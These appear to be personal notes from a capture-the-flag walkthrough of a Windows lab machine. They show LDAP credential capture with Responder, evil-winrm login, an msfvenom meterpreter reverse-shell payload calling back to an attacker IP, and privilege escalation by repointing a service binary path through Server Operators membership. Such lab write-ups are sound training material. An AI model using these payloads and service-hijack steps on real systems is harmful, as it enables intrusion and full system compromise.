Responder:

```
[LDAP] Cleartext Client   : 10.129.95.241
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

Enum4linux-ng:

```
enum4linux-ng 10.129.95.241 -u svc-printer -p '1edFg43012!!' -oA enum4.out
```

# Privilege Escalation

After logging in with `evil-winrm` with prepared scripts
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
```
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!' -s /home/volt/htb/return

whoami /priv
Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

`SeBackupPrivilege`:
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
I can get access to the file system but I can not manipulate files :(

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=1337 -f exe -o shell.exe
upload shell.exe

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
```

```
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

Nothing works so:
```
net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   11/27/2023 6:27:38 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators     
Global Group memberships     *Domain Users    
```

## Server Operators group
https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators
#local_group #windows_privesc
Members of this group can start/stop system services. Let's modify a service binary path to obtain a reverse shell.
```
sc.exe stop vss
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell.exe"
sc.exe start vss
```

This will start a new shell with NT Authority/SYSTEM in meterpreter that needs to be migrated:
```
ps
migrate <pid> # of SYSTEM
```

And full access is gained!